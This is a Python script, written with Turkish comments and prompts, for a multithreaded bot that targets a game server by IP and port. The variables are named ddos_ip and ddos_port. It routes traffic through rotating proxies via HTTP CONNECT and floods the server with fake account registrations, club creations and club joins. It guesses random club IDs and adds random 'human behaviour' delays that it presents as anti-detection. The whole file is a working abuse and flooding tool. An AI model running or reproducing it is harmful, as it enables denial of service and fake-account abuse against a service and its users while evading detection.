import os
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
import socket
import threading
import random
from src.auth.login import login


import time
from datetime import datetime
from queue import Queue

# renk kodları
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ekran temizle
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# banner
def show_banner():
    banner = f"""
    {Colors.CYAN}{Colors.BOLD}
    ╔══════════════════════════════════════════════════╗
    ║                                                  ║
    ║   ████████╗██╗███╗   ███╗███████╗                ║
    ║      ██╔══╝██║████╗ ████║██╔════╝                ║
    ║      ██║   ██║██╔████╔██║█████╗                  ║
    ║      ██║   ██║██║╚██╔╝██║██╔══╝                  ║
    ║      ██║   ██║██║ ╚═╝ ██║███████╗                ║
    ║      ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝                ║
    ║                                                  ║
    ║   ████████╗███████╗ █████╗ ███╗   ███╗           ║
    ║      ██╔══╝██╔════╝██╔══██╗████╗ ████║           ║
    ║      ██║   █████╗  ███████║██╔████╔██║           ║
    ║      ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║           ║
    ║      ██║   ███████╗██║  ██║██║ ╚═╝ ██║           ║
    ║      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝           ║
    ║                                                  ║
    ║   {Colors.GREEN}Powered by arda64{Colors.CYAN}                              ║
    ╚══════════════════════════════════════════════════╝
    {Colors.ENDC}
    """
    print(banner)

# istatislik
successful_accounts = 0
failed_accounts = 0
retried_proxies = 0
found_clubs = []  # 
start_time = None

# Proxy yöneticisi sınıfı
class ProxyManager:
    def __init__(self, proxy_list):
        self.all_proxies = proxy_list.copy()
        self.working_proxies = proxy_list.copy()
        self.failed_proxies = []
        self.proxy_queue = Queue()
        self.proxy_stats = {} 
        self.lock = threading.Lock()
        
        for proxy in self.working_proxies:
            self.proxy_queue.put(proxy)
            self.proxy_stats[proxy] = {"success": 0, "fail": 0}
    
    def get_proxy(self):
        """Sıradaki proxy'yi döndürür, yoksa rastgele bir proxy seçer"""
        with self.lock:
            if self.proxy_queue.empty():
                retry_candidates = [p for p in self.failed_proxies 
                                   if self.proxy_stats[p]["fail"] < 3] 
                
                if retry_candidates and random.random() < 0.3: 
                    proxy = random.choice(retry_candidates)
                    self.failed_proxies.remove(proxy)
                    print(f"{Colors.YELLOW}[↺] Başarısız proxy tekrar deneniyor: {proxy}{Colors.ENDC}")
                    global retried_proxies
                    retried_proxies += 1
                    return proxy
                
                if not self.working_proxies:
                    self.reload_proxies()
                    if not self.working_proxies:
                        return None  
                    
                return random.choice(self.working_proxies)
            
            return self.proxy_queue.get()
    
    def reload_proxies(self):
        """Proxy listesini yeniden yükler"""
        print(f"{Colors.YELLOW}[⟳] Proxy listesi yeniden yükleniyor...{Colors.ENDC}")
        try:
            with open("../../data/proxies/working_proxies.txt", "r") as f:
                new_proxies = [line.strip() for line in f if line.strip()]
            
            for proxy in new_proxies:
                if proxy not in self.proxy_stats:
                    self.proxy_stats[proxy] = {"success": 0, "fail": 0}
            
            self.all_proxies = new_proxies.copy()
            self.working_proxies = new_proxies.copy()
            self.failed_proxies = []
            
            for proxy in self.working_proxies:
                self.proxy_queue.put(proxy)
            
            print(f"{Colors.GREEN}[✓] {len(new_proxies)} adet proxy yeniden yüklendi.{Colors.ENDC}")
            return True
        except Exception as e:
            print(f"{Colors.RED}[✗] Proxy yeniden yükleme hatası: {str(e)}{Colors.ENDC}")
            return False
    
    def report_success(self, proxy):
        """Proxy başarılı olduğunda çağrılır"""
        with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["success"] += 1
            
            self.proxy_queue.put(proxy)
            
            if proxy in self.failed_proxies:
                self.failed_proxies.remove(proxy)
                
            if proxy not in self.working_proxies:
                self.working_proxies.append(proxy)
    
    def report_failure(self, proxy):
        """Proxy başarısız olduğunda çağrılır"""
        with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["fail"] += 1
            
            if proxy in self.working_proxies:
                self.working_proxies.remove(proxy)
                
            if proxy not in self.failed_proxies:
                self.failed_proxies.append(proxy)
    
    def get_stats(self):
        """Proxy istatistiklerini döndürür"""
        with self.lock:
            return {
                "total": len(self.all_proxies),
                "working": len(self.working_proxies),
                "failed": len(self.failed_proxies),
                "detailed": self.proxy_stats
            }


def show_stats():
    if start_time:
        elapsed = datetime.now() - start_time
        elapsed_str = str(elapsed).split('.')[0]  
        zaman = datetime.now() 
        
        print(f"\n{Colors.BOLD}━━━━━━━━━━━━━ İSTATİSTİKLER ━━━━━━━━━━━━━{Colors.ENDC}")
        print(f"{Colors.GREEN}✓ Başarılı: {successful_accounts}{Colors.ENDC}")
        print(f"{Colors.RED}✗ Başarısız: {failed_accounts}{Colors.ENDC}")
        print(f"{Colors.YELLOW}↺ Tekrar Denenen: {retried_proxies}{Colors.ENDC}")
        
        if proxy_manager:
            stats = proxy_manager.get_stats()
            print(f"{Colors.CYAN}⚡ Proxy Durumu: {stats['working']}/{stats['total']} aktif{Colors.ENDC}")
        
        print(f"{Colors.YELLOW}⏱ Çalışma Süresi: {elapsed_str}{Colors.ENDC}")
        if successful_accounts > 0:
            rate = successful_accounts / elapsed.total_seconds() * 60
            print(f"{Colors.CYAN}⚡ Hız: {rate:.2f} hesap/dakika{Colors.ENDC}")
            print(f" tarih: {zaman.hour}:{zaman.minute}:{zaman.second}")
            
        if found_clubs:
            print(f"{Colors.GREEN}🏆 Bulunan Kulüpler: {len(found_clubs)}{Colors.ENDC}")
            for club_id in found_clubs[-5:]:
                print(f"{Colors.CYAN}   ▶ Kulüp ID: {club_id}{Colors.ENDC}")
            
        print(f"{Colors.BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.ENDC}")

# Ana program
clear_screen()
show_banner()

print(f"{Colors.YELLOW}Hedef Bilgileri Girin:{Colors.ENDC}")
ddos_ip = input(f"{Colors.CYAN}➤ Hedef IP: {Colors.ENDC}")
ddos_port = int(input(f"{Colors.CYAN}➤ Hedef Port: {Colors.ENDC}"))
version = int(input(f"{Colors.CYAN}➤ Sunucu Versiyonu: {Colors.ENDC}"))
num_threads = int(input(f"{Colors.CYAN}➤ Thread Sayısı: {Colors.ENDC}"))


print(f"\n{Colors.YELLOW}Anti-Detection Ayarları:{Colors.ENDC}")
enable_random_delays = input(f"{Colors.CYAN}➤ İnsan davranışı simülasyonu aktif olsun mu? (E/H): {Colors.ENDC}").upper() in ["E", "EVET", "Y", "YES"]

if enable_random_delays:
    min_delay = float(input(f"{Colors.CYAN}➤ Minimum bekleme süresi (saniye): {Colors.ENDC}"))
    max_delay = float(input(f"{Colors.CYAN}➤ Maximum bekleme süresi (saniye): {Colors.ENDC}"))
    print(f"{Colors.GREEN}✓ İnsan davranışı simülasyonu aktif edildi ({min_delay}-{max_delay} sn){Colors.ENDC}")
else:
    min_delay = 0.2
    max_delay = 1.0
    print(f"{Colors.YELLOW}⚠ İnsan davranışı simülasyonu devre dışı. Tespit riski yüksek!{Colors.ENDC}")

print(f"\n{Colors.YELLOW}Yapılacak İşlemleri Seçin:{Colors.ENDC}")

print(f"{Colors.CYAN}[1] {Colors.ENDC}Hesap Oluştur")
print(f"{Colors.CYAN}[2] {Colors.ENDC}Kulüp Oluştur")
print(f"{Colors.CYAN}[3] {Colors.ENDC}Kulübe Katıl")

selected_operations = input(f"{Colors.CYAN}➤ Seçiminiz (örn: 1,2,3 veya 1): {Colors.ENDC}")
selected_operations = [int(op.strip()) for op in selected_operations.split(",") if op.strip().isdigit()]

create_accounts = 1 in selected_operations
create_clubs = 2 in selected_operations
join_clubs = 3 in selected_operations


if create_clubs:
    print(f"\n{Colors.YELLOW}Kulüp Bilgileri Girin:{Colors.ENDC}")
    club_name = input(f"{Colors.CYAN}➤ Kulüp Adı: {Colors.ENDC}")
    club_description = input(f"{Colors.CYAN}➤ Kulüp Açıklaması: {Colors.ENDC}")

if join_clubs:
    print(f"\n{Colors.YELLOW}Kulüp Bulma Seçenekleri:{Colors.ENDC}")
    print(f"{Colors.CYAN}[1] {Colors.ENDC}Belirli bir kulübe ID ile katıl")
    print(f"{Colors.CYAN}[2] {Colors.ENDC}Rastgele kulüp ID'leri dene")
    print(f"{Colors.CYAN}[3] {Colors.ENDC}Kulüp etiketi ile katıl (#QO8JSL3 gibi)")
    
    club_id_option = input(f"{Colors.CYAN}➤ Seçiminiz (1, 2 veya 3): {Colors.ENDC}")
    
    if club_id_option == "1":
        print(f"\n{Colors.YELLOW}Kulüp ID Bilgileri Girin:{Colors.ENDC}")
        club_high_id = int(input(f"{Colors.CYAN}➤ Kulüp High ID (0 genelde): {Colors.ENDC}"))
        club_low_id = int(input(f"{Colors.CYAN}➤ Kulüp Low ID: {Colors.ENDC}"))
        use_random_club_ids = False
        use_club_tag = False
    elif club_id_option == "3":
        print(f"\n{Colors.YELLOW}Kulüp Etiketi Girin:{Colors.ENDC}")
        club_tag = input(f"{Colors.CYAN}➤ Kulüp Etiketi (örn: #QO8JSL3): {Colors.ENDC}")
        use_random_club_ids = False
        use_club_tag = True
    else:
        print(f"{Colors.YELLOW}Rastgele kulüp ID'leri denenecek.{Colors.ENDC}")
        min_club_id = int(input(f"{Colors.CYAN}➤ Minimum Kulüp ID: {Colors.ENDC}"))
        max_club_id = int(input(f"{Colors.CYAN}➤ Maximum Kulüp ID: {Colors.ENDC}"))
        use_random_club_ids = True
        use_club_tag = False
        found_clubs_file = "found_clubs.txt"
        
        try:
            with open(found_clubs_file, "r") as f:
                found_clubs = [int(line.strip()) for line in f.readlines() if line.strip().isdigit()]
            print(f"{Colors.GREEN}✓ {len(found_clubs)} kayıtlı kulüp ID'si yüklendi.{Colors.ENDC}")
        except FileNotFoundError:
            print(f"{Colors.YELLOW}⚠ {found_clubs_file} dosyası bulunamadı. Yeni dosya oluşturulacak.{Colors.ENDC}")

def load_proxies():
    proxies = []
    print(f"\n{Colors.YELLOW}Proxy Listesi Yükleniyor...{Colors.ENDC}")
    try:
        with open("../../data/proxies/working_proxies.txt", "r") as f:
            proxies = [line.strip() for line in f.readlines() if line.strip()]
        print(f"{Colors.GREEN}✓ {len(proxies)} proxy yüklendi.{Colors.ENDC}")
    except FileNotFoundError:
        print(f"{Colors.RED}✗ Hata: working_proxies.txt dosyası bulunamadı!{Colors.ENDC}")
    return proxies

proxy_list = load_proxies()
if not proxy_list:
    print(f"{Colors.RED}✗ Proxy listesi boş! İşlem durduruluyor.{Colors.ENDC}")
    sys.exit(1)

proxy_manager = ProxyManager(proxy_list)

def send_register_packet():
    global successful_accounts, failed_accounts
    while True:
        try:
            proxy = proxy_manager.get_proxy()
            
            if not proxy:
                print(f"{Colors.RED}✗ Tüm proxy'ler denendi ve başarısız oldu. Tekrar deneniyor...{Colors.ENDC}")
                time.sleep(5)  
                continue
                
            proxy_ip, proxy_port = proxy.split(":")
            proxy_port = int(proxy_port)

            s = socket.socket()
            s.settimeout(5)
            s.connect((proxy_ip, proxy_port))

            connect_req = f"CONNECT {ddos_ip}:{ddos_port} HTTP/1.1\r\nHost: {ddos_ip}:{ddos_port}\r\n\r\n"
            s.sendall(connect_req.encode())

            resp = s.recv(4096)
            if b"200" not in resp:
                print(f"{Colors.RED}✗ Proxy başarısız: {proxy}{Colors.ENDC}")
                proxy_manager.report_failure(proxy)
                failed_accounts += 1
                s.close()
                continue

            if enable_random_delays:
                human_delay = random.uniform(min_delay, max_delay)
                time.sleep(human_delay)

            l = login()
            success_message = ""
            
            if create_accounts:
                s.send(l.create_account(version))
                success_message += "Hesap oluşturuldu "
                
                if enable_random_delays:
                    human_delay = random.uniform(min_delay, max_delay)
                    time.sleep(human_delay)
            
            if create_clubs:
                s.send(l.create_club(club_name, club_description))
                if success_message:
                    success_message += "& "
                success_message += "Kulüp oluşturuldu "
                
                if enable_random_delays:
                    human_delay = random.uniform(min_delay, max_delay)
                    time.sleep(human_delay)
                
            if join_clubs:
                current_club_id = None
                
                if use_club_tag:
                    s.send(l.join_club_by_tag(club_tag))
                    if success_message:
                        success_message += "& "
                    success_message += f"Kulübe etiket ile katıldı ({club_tag}) "
                elif use_random_club_ids:
                    if found_clubs and random.random() < 0.7: 
                        current_club_id = random.choice(found_clubs)
                    else:
                        current_club_id = random.randint(min_club_id, max_club_id)
                    
                    s.send(l.join_club(0, current_club_id))  # High ID genelde 0
                else:
                    current_club_id = club_low_id
                    s.send(l.join_club(club_high_id, club_low_id))
                
                if success_message:
                    success_message += "& "
                    success_message += f"Kulübe katıldı (ID: {current_club_id}) "
                
                # Başarılı olduğunda kulüp ID'sini listeye ekle
                if current_club_id and use_random_club_ids and current_club_id not in found_clubs:
                    found_clubs.append(current_club_id)
                    # Dosyaya kaydet
                    with open("found_clubs.txt", "a") as f:
                        f.write(f"{current_club_id}\n")
                    print(f"{Colors.GREEN}[🏆] Yeni kulüp bulundu! ID: {current_club_id}{Colors.ENDC}")

            # Eğer hiçbir işlem seçilmediyse
            if not success_message:
                success_message = "İşlem yapılmadı "

            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Cihaz bilgilerini log'a ekle
            device_info = f" [{l.device_model}/{l.os_version[:3]}]" if hasattr(l, 'device_model') else ""
            print(f"{Colors.GREEN}[{timestamp}] ✓ {success_message}via {proxy}{device_info}{Colors.ENDC}")
            
            successful_accounts += 1
            proxy_manager.report_success(proxy)
            s.close()
            
            # İnsan davranışını simüle et - işlem sonrası rastgele bekleme
            if enable_random_delays:
                human_delay = random.uniform(min_delay * 2, max_delay * 2)  # İşlem sonrası daha uzun bekle
                time.sleep(human_delay)

        except Exception as e:
            print(f"{Colors.RED}✗ Hata ({proxy}): {str(e)}{Colors.ENDC}")
            if proxy:
                proxy_manager.report_failure(proxy)
            failed_accounts += 1
            continue

print(f"\n{Colors.GREEN}► İşlem başlatılıyor... {num_threads} thread ile.{Colors.ENDC}")
print(f"{Colors.CYAN}ℹ Toplam {len(proxy_list)} proxy kullanılacak.{Colors.ENDC}")
start_time = datetime.now()

for _ in range(num_threads):
    threading.Thread(target=send_register_packet, daemon=True).start()

try:
    while True:
        time.sleep(5)
        show_stats()
except KeyboardInterrupt:
    print(f"\n{Colors.YELLOW}Program durduruluyor...{Colors.ENDC}")
    show_stats()
    print(f"\n{Colors.GREEN}Program sonlandı. Çıkmak için ENTER tuşuna basın...{Colors.ENDC}")

input("")